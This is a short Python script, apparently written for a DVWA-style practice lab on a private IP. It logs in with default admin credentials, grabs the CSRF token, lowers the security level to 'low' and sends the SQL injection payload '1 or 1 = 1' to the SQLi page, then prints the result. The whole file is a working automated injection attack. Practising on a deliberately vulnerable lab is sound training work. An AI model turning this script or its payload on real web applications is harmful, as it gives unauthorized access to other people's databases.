from bs4 import BeautifulSoup
import requests

s = requests.Session()

login_url="http://192.168.20.128/login.php"
sec_form="http://192.168.20.128/security.php"
target = "http://192.168.20.128/vulnerabilities/sqli/"

resp = s.get(login_url)
parsed_html = BeautifulSoup(resp.content, features="html.parser")
csrf = parsed_html.body.find('input', attrs={'name':'user_token'}).get("value")

login_form = {
	'username': 'admin',
	'password': 'password',
	'Login': 'Login',
	'user_token':  csrf
	}
sec={
	'security': "low",
	'seclev_submit': 'Submit',
	'user_token':  csrf
	}
sqli={
	'id': "1 or 1 = 1",
	'Submit': 'Submit',
	'user_token':  csrf
	}
	
response = s.post(login_url, login_form)
change_sec=s.post(sec_form, sec)
send_inj = s.post(target, sqli)

parsed_html = BeautifulSoup(send_inj.content, features="html.parser")
print(parsed_html)
